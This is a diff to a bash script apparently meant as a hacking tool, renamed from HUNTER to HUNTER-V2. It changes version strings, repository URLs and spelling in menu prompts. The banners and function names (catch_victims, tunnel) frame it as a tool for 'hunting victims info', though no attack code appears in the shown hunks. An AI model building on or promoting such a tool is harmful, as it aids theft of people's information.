@@ -1,5 +1,5 @@
-__NAME__="HUNTER"
-__VERSION__="1.0.6"
+__NAME__="HUNTER-V2"
+__VERSION__="2.0"
 __AUTHOR__="ATHEX"
 
 ### Script termination
@@ -135,7 +135,7 @@ function suspend_script()
     printf "\033[1;33m[\033[1;37m++\033[1;33m] Please contact the author at \033[1;37mathexithouse@gmail.com\033[1;37m\n"
     printf "\033[1;33m[\033[1;37m++\033[1;33m] Also follow us on github, star and fork this our hacking tools\033[1;37m\n"
     printf "\033[1;33m[\033[1;37m++\033[1;33m] Thank for using \033[1;37mHUNTER\033[1;33m!, and again happy hunting victims info\033[1;37m";loading
-    Athexhacker="https://github.com/Athexhacker/HUNTER" 
+    Athexhacker="https://github.com/Athexhacker/HUNTER-V2" 
     xdg-open $Athexhacker
     echo ""
 }
@@ -147,7 +147,7 @@ function redirection()
     printf "\033[1;33m[\033[1;37m++\033[1;33m] Please contact the author at \033[1;37mathexithouse@gmail.com\033[1;37m\n"
     printf "\033[1;33m[\033[1;37m++\033[1;33m] Also follow us on github, star and fork this our hacking tools\033[1;37m\n"
     printf "\033[1;33m[\033[1;37m++\033[1;33m] Thank for using \033[1;37mHUNTER\033[1;33m!, and again happy hunting victims info\033[1;37m";loading
-    Athexhacker="https://github.com/Athexhacker/HUNTER" 
+    Athexhacker="https://github.com/Athexhacker/HUNTER-V2" 
     xdg-open $Athexhacker
     echo ""
 }
@@ -425,10 +425,10 @@ function catch_victims()
         printf "\033[1;33m[\033[1;37m++\033[1;33m] For more information regardless to this tool\033[1;37m\n"
         printf "\033[1;33m[\033[1;37m++\033[1;33m] Please contact the author at \033[1;37mathexithouse@gmail.com\033[1;37m\n"
         printf "\033[1;33m[\033[1;37m++\033[1;33m] Also follow us on github, star and fork this our hacking tools\033[1;37m\n"
-        printf "\033[1;33m[\033[1;37m++\033[1;33m] Thank for using \033[1;37m\033[1;37mHUNTER\033[1;33m\033[1;33m!, and again happy hunting victims info\033[1;37m";loading
+        printf "\033[1;33m[\033[1;37m++\033[1;33m] Thank for using \033[1;37m\033[1;37mHUNTER-V2\033[1;33m\033[1;33m!, and again happy hunting victims info\033[1;37m";loading
     fi
 
-    Athexhacker="https://github.com/Athexhacker/HUNTER"
+    Athexhacker="https://github.com/Athexhacker/HUNTER-V2"
     xdg-open $Athexhacker
     echo ""
     exit 0
@@ -888,14 +888,14 @@ function menu()
     # if [[ $act -lt "1"]] || if [[ $act -gt "5"]]; then
     if [[ -z  $act ]]; then
         printf "\n\033[1;31m[\033[1;37m--\033[1;31m] Action Can't be Empty!\n"
-        printf "\033[1;31m[\033[1;37m!!\033[1;31m] Please Select From The Above Maintion!\033[0m\n"
+        printf "\033[1;31m[\033[1;37m!!\033[1;31m] Please Select From The Above Option!\033[0m\n"
         sleep 2
         menu
     fi
 
     if [[ $act == 1 ]] || [[ $act == 01 ]]; then
         Sleep 2
-        printf "\n\033[1;31m[\033[1;37m!!\033[1;31m] Hope you enjoy using \033[1;37mHUNTER\033[1;31m.\033[0m\n"
+        printf "\n\033[1;31m[\033[1;37m!!\033[1;31m] Hope you enjoy using \033[1;37mHUNTER-V2\033[1;31m.\033[0m\n"
         redirection
     elif [[ $act == 2 ]] || [[ $act == 02 ]]; then
         sleep 2
@@ -911,7 +911,7 @@ function menu()
         tunnel
     else
         printf "\n\033[1;31m[\033[1;37m--\033[1;31m] Invalid Choice!\n"
-        printf "\033[1;31m[\033[1;37m!!\033[1;31m] Please Select From The Above Maintion.\033[0m\n"
+        printf "\033[1;31m[\033[1;37m!!\033[1;31m] Please Select From The Above option.\033[0m\n"
         sleep 1
         menu
     fi
@@ -927,4 +927,5 @@ function hunter()
     menu
 }
 
-hunter 
+hunter
+
